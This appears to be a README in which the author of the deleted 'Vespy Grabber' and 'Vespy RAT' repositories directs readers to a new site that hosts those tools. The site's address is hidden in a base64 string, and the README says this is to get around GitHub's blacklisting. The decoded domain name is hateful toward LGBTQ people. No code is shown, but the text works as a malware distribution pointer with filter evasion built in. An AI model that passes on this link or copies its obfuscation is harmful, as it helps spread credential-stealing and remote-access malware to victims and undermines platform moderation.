# Vespy-2.0

Yep, this is me vesper. As you know, my github vesperlol got sadly deleted. Vespy Grabber and Vespy RAT repos got deleted too. I uploaded Vespy projects on my new site that you'll need to decode in base64 here : https://www.base64decode.org/ , since github blacklisted this site im pretty sure. Here's the base64 string ' aHR0cHM6Ly9mdWNrLWxnYnRxLmNvbQ== '. Just decode this string and you'll be able to acces the site :P
